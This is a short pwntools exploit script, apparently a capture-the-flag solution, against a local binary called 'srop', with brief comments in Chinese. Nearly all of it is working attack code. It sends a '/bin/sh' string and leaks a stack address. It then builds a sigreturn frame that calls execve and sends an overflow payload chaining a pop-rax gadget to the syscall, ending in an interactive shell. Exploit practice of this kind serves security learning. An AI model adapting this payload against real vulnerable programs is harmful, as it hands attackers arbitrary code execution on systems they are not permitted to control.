from pwn import *
context(os='linux',arch='amd64',log_level='debug')
p = process('./srop')
elf = ELF('./srop')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# gdb.attach(p,'b *0x4011ee')

pop_rax = 0x4011ED
syscall = 0x4011DA
#输入/bin/sh，并泄露0x30最后的堆栈地址，再执行vuln
payload1 = 2*b'/bin/sh\x00' + p64(elf.sym['vuln'])
p.sendafter(b'hacker!\n',payload1)
stack = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
p.success("stack -- >> 0x%X" % stack)
binsh = stack - 0x28

#用pwntools自带的工具构建系统调用结构rt_sigreturn
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = binsh
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rip = syscall

sleep(1)
payload2 = 0x10*b'a' + p64(pop_rax) + p64(0xf) + flat(sigframe)
p.sendline(payload2)
# pause()
p.interactive()